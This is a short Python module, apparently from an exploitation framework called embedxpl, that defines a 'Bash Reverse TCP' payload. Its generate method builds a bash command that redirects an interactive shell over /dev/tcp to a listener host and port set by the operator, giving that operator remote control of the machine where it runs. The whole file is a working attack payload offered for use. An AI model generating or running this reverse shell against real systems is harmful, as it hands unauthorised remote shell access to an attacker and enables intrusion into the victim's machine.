from embedxpl.core.exploit import *
from embedxpl.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Bash Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using bash.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
    }

    cmd = OptString("bash", "Bash binary")

    def generate(self):
        return f"{self.cmd} -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
